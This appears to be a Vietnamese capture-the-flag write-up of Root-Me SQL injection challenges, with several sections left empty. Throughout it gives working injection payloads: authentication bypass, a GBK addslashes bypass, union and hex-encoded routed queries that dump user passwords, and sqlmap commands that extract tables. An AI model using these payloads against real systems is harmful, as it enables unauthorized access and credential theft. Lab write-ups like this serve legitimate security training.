### [SQL Injection - Authentication]()


Ta đơn giản sử dụng payload *username = admin’--* để bypass qua phần password của admin.


Sau đó mở source code để check password, pass cũng chính là flag.


### [SQL injection - Authentication - GBK]()

Có vẻ như function addslashes được sử dụng ở trường login còn md5 ở trường password . Kịch bản như thế này, chỉ cần chú ý bypass addslashes ở trường login là được. Không cần để ý trường password.


[GBK](https://en.wikipedia.org/wiki/GBK_(character_encoding))


%bf%27%20or%201=1%20--


### [SQL Truncation]()




### [SQL injection - Error]()
```
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --dbs 
```

Trong đó đoạn trong ngoặc kép là url của trang cần khai thác. --dbs là để lấy dữ liệu database. Chờ 1 lúc thì được kết quả:

Kết quả trả về cho ta thấy bài này xuất hiện 2 cách khai thác sqli bao gồm khai khác blind và error. Có 3 database trả về, tuy nhiên ta chỉ cần chú ý đến database public là được. Thực hiện lấy các tables trên database này: 
```
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public --tables
```
Trong đó --tables sử dụng để lấy tên các bảng. -D public là để lấy kết quả trong database public.

```
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump 
```

Trong đó -T là bảng cần lấy data. --dump để lấy toàn bộ dữ liệu bảng này:

### [SQL injection - Insert]()




### [SQL injection - Time based]()



### [SQL injection - Filter bypass]()





### [SQL injection - String]()

Đầu tiên ta sử dụng 1 payload để server trả về lỗi systax hoặc lỗi gì đó để xác định version của server sql. Trong trường hợp này SQLite3 


Dùng payload như sau để xác định số cột trong database 1’ order by 1-- và tăng dần cho đến khi trả về lỗi. Lần này số cột sẽ là 2.


Ta lấy tên bảng bằng cách truy vấn. Với SQLite3 ta gõ lệnh sau: 
```
1' union select 1,sql from sqlite_master--
```



```
1’ union select username,password FROM users--
```


### [SQL injection - Numeric]()

Ta sử dụng tương tự các payload tương tự như trên để xác định các thành phần cơ bản như trên của server.







```
1 union select 1,2,3--
```



1 union select 2,3,sql from sqlite_master--



```
1 union select 1,username,password FROM users--
```



### [SQL Injection - Routed]()

```
‘ union select 1’ order by 1-- 
```

Ta sử dụng burpsuite để bắt truy vấn và thực hiện cho đơn giản

```
union select 1’ union select 1,2-- - -- -
```


```
1’ union select 1’ union select @@version-- - -- -
```


```
' union select 0x27206F726465722062792033202D2D202D -- -

```


```
' union select ' union select 1,table_name from information_schema.tables where table_schema = database() -- - -- -

 'union select 0x2720756E696F6E2073656C65637420312C7461626C655F6E616D652066726F6D20696E666F726D6174696F6E5F736368656D612E7461626C6573207768657265207461626C655F736368656D61203D2064617461626173652829202D2D202D202D2D202D -- - --
 
```



```
1' union select ' union SELECT 1,group_concat(login,' : ',password) FROM users-- - -- -

1' union select 0x2720756E696F6E2053454C45435420312C67726F75705F636F6E636174286C6F67696E2C27203A20272C70617373776F7264292046524F4D2075736572732D2D202D -- - --
```




### [SQL Injection - File reading]()

Bài này có filter mất ký tự ‘ và “ nên nếu cần sử dụng, ta sẽ mã hóa đoạn đó sang hex để sử dụng. Ta cũng thực hiện khai thác lần lượt để lấy dữ liệu. Ta sẽ lấy cột có thể khai thác. Gõ lệnh:

```
-1 union select 1,2,3,4--
```



-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema = database()--


Vậy là có 1 bảng tên member. Thực hiện lấy column_name từ bảng member.
Trong đó ‘member’ được mã hóa sang mã hex:

-1 union select 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 0x6d656d626572--

Kết quả trả về 4 cột, tuy nhiên ta chỉ cần lấy 2 cột member_login và member_password để khai thác là được. Thực hiện lấy dữ liệu 2 cột:

-1 union select 1,2,3,group_concat(member_login,member_password) FROM member--



### [SQL Injection - Blind]()



username=user1' and substr((select password from users where (username=’user1')),1,1)=’§subpass§’ — &password=password






